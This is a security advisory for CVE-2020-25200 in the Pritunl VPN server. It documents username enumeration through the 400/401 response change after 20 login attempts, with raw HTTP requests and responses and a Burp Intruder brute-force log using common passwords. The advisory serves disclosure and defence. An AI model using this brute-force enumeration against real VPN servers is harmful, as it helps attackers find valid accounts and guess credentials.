CVE-2020-25200

Pritunl VPN server - Affected version: Pritunl v1.29.2145.25 553bbd

=========================

Pritunl 1.29.2145.25 allows attackers to enumerate valid VPN usernames via a series of /auth/session login attempts. Initially, the server will return error 401. However, if the username is valid, then after 20 login
attempts, the server will start responding with error 400. Invalid usernames will receive error 401 indefinitely.

=========================

To exploit this vulnerability the attacker needs to start brute-forcing the login repeatedly with the same username. Initially, the server will return error 401 but after 20 attempts, the server
will start returning error 400 if the username is valid. If the username is invalid, the server will keep returning error 401 indefinitely. Therefore it is possible to verify if the username
exists by receiving error 400.

=========================

HTTP request and response for a valid username (after 20 attempts):

POST /auth/session HTTP/1.1
Host: 192.168.1.18
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 40
Origin: https://192.168.1.18
Connection: close
Referer: https://192.168.1.18/login

{"username":"pritunl","password":"paul"}

HTTP/1.1 400 Bad Request
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 76
Content-Type: application/json
Date: Thu, 03 Sep 2020 22:42:39 GMT
Expires: 0
Pragma: no-cache
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
Connection: close

{"error_msg": "Too many authentication attempts.", "error": "auth_too_many"}

=========================

HTTP request and response for an invalid username (after 20 attempts):

POST /auth/session HTTP/1.1
Host: 192.168.1.18
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 39
Origin: https://192.168.1.18
Connection: close
Referer: https://192.168.1.18/login

{"username":"admin","password":"scott"}


HTTP/1.1 401 Unauthorized
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 83
Content-Type: application/json
Date: Thu, 03 Sep 2020 22:42:43 GMT
Expires: 0
Pragma: no-cache
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
Connection: close

{"error_msg": "Authentication credentials are not valid.", "error": "auth_invalid"}

=========================
Burp Intruder Log:

0		401	false	false	370	
1	123456	401	false	false	370	
2	password	401	false	false	370	
3	12345678	401	false	false	370	
4	qwerty	401	false	false	370	
5	123456789	401	false	false	370	
6	12345	401	false	false	370	
7	1234	401	false	false	370	
8	111111	401	false	false	370	
9	1234567	401	false	false	370	
10	dragon	401	false	false	370	
11	123123	401	false	false	370	
12	baseball	401	false	false	370	
13	abc123	401	false	false	370	
14	football	401	false	false	370	
15	monkey	401	false	false	370	
16	letmein	401	false	false	370	
17	696969	401	false	false	370	
18	shadow	401	false	false	370	
19	master	401	false	false	370	
20	666666	400	false	false	362	  <-------------- change of the length and of the response code
21	qwertyuiop	400	false	false	362	
22	123321	400	false	false	362	
23	mustang	400	false	false	362	
24	1234567890	400	false	false	362	
25	michael	400	false	false	362	
26	654321	400	false	false	362	
27	pussy	400	false	false	362	
28	superman	400	false	false	362	
29	1qaz2wsx	400	false	false	362	
30	7777777	400	false	false	362	
31	xxxxx	400	false	false	362	
32	121212	400	false	false	362	
33	000000	400	false	false	362	
34	qazwsx	400	false	false	362	
35	123qwe	400	false	false	362	
36	killer	400	false	false	362	
37	trustno1	400	false	false	362	
38	jordan	400	false	false	362	
39	jennifer	400	false	false	362	
40	zxcvbnm	400	false	false	362	
41	asdfgh	400	false	false	362	
42	hunter	400	false	false	362	

<<CUT>>

=========================


Security Researcher - Lukasz Studniarz

